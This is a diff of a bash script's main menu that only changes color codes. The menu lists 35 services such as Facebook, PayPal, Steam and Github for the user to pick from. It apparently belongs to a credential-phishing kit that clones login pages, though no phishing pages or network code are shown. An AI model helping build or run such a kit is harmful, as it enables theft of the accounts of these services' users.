-		${RED}[${WHITE}34${RED}]${ORANGE} Discord       ${RED}[${WHITE}35${RED}]${ORANGE} Roblox 
+		${MAGENTA}[${WHITE}01${MAGENTA}]${CYAN} Facebook      ${MAGENTA}[${WHITE}11${MAGENTA}]${CYAN} Twitch       ${MAGENTA}[${WHITE}21${MAGENTA}]${CYAN} DeviantArt
+		${MAGENTA}[${WHITE}02${MAGENTA}]${CYAN} Instagram     ${MAGENTA}[${WHITE}12${MAGENTA}]${CYAN} Pinterest    ${MAGENTA}[${WHITE}22${MAGENTA}]${CYAN} Badoo
+		${MAGENTA}[${WHITE}03${MAGENTA}]${CYAN} Google        ${MAGENTA}[${WHITE}13${MAGENTA}]${CYAN} Snapchat     ${MAGENTA}[${WHITE}23${MAGENTA}]${CYAN} Origin
+		${MAGENTA}[${WHITE}04${MAGENTA}]${CYAN} Microsoft     ${MAGENTA}[${WHITE}14${MAGENTA}]${CYAN} Linkedin     ${MAGENTA}[${WHITE}24${MAGENTA}]${CYAN} DropBox	
+		${MAGENTA}[${WHITE}05${MAGENTA}]${CYAN} Netflix       ${MAGENTA}[${WHITE}15${MAGENTA}]${CYAN} Ebay         ${MAGENTA}[${WHITE}25${MAGENTA}]${CYAN} Yahoo		
+		${MAGENTA}[${WHITE}06${MAGENTA}]${CYAN} Paypal        ${MAGENTA}[${WHITE}16${MAGENTA}]${CYAN} Quora        ${MAGENTA}[${WHITE}26${MAGENTA}]${CYAN} Wordpress
+		${MAGENTA}[${WHITE}07${MAGENTA}]${CYAN} Steam         ${MAGENTA}[${WHITE}17${MAGENTA}]${CYAN} Protonmail   ${MAGENTA}[${WHITE}27${MAGENTA}]${CYAN} Yandex			
+		${MAGENTA}[${WHITE}08${MAGENTA}]${CYAN} Twitter       ${MAGENTA}[${WHITE}18${MAGENTA}]${CYAN} Spotify      ${MAGENTA}[${WHITE}28${MAGENTA}]${CYAN} StackoverFlow
+		${MAGENTA}[${WHITE}09${MAGENTA}]${CYAN} Playstation   ${MAGENTA}[${WHITE}19${MAGENTA}]${CYAN} Reddit       ${MAGENTA}[${WHITE}29${MAGENTA}]${CYAN} Vk
+		${MAGENTA}[${WHITE}10${MAGENTA}]${CYAN} Tiktok        ${MAGENTA}[${WHITE}20${MAGENTA}]${CYAN} Adobe        ${MAGENTA}[${WHITE}30${MAGENTA}]${CYAN} XBOX
+		${MAGENTA}[${WHITE}31${MAGENTA}]${CYAN} Mediafire     ${MAGENTA}[${WHITE}32${MAGENTA}]${CYAN} Gitlab       ${MAGENTA}[${WHITE}33${MAGENTA}]${CYAN} Github
+		${MAGENTA}[${WHITE}34${MAGENTA}]${CYAN} Discord       ${MAGENTA}[${WHITE}35${MAGENTA}]${CYAN} Roblox 
 
-		${RED}[${WHITE}99${RED}]${ORANGE} About         ${RED}[${WHITE}00${RED}]${ORANGE} Exit
+		${MAGENTA}[${WHITE}99${MAGENTA}]${CYAN} About         ${MAGENTA}[${WHITE}00${MAGENTA}]${CYAN} Exit
 
 	EOF
 	
-	read -p "${RED}[${WHITE}-${RED}]${GREEN} Select an option : ${BLUE}"
+	read -p "${MAGENTA}[${WHITE}-${RED}]${GREEN} Select an option : ${BLUE}"
 
 	case $REPLY in 
 		1 | 01)
@@ -896,7 +898,7 @@ main_menu() {
 		0 | 00 )
 			msg_exit;;
 		*)
-			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
+			echo -ne "\n${MAGENTA}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
 			{ sleep 1; main_menu; };;
 	
 	esac
